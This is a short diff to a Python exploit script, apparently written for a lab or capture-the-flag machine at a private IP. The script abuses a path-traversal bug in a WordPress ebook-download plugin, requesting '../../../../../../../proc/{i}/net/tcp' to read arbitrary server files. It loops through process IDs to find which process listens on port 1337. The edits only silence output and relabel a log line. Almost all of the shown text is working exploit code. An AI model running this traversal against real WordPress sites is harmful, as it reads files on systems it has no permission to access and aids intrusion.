@@ -7,7 +7,7 @@ url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php'
 
 def readfile(path):
     res = rq.get(url, params={'ebookdownloadurl': path})
-    print(res.text)
+    #print(res.text)
     return res
 
 
@@ -27,7 +27,7 @@ while True:
     path = input('path> ')
     if path == '':
         for i in range(1, 9999):
-            print(f'[*] Port: {i}')
+            print(f'[*] Pid: {i}')
             res = readfile(f'../../../../../../../proc/{i}/net/tcp')
             ports = parse_port(res.text)
             if 1337 in ports:
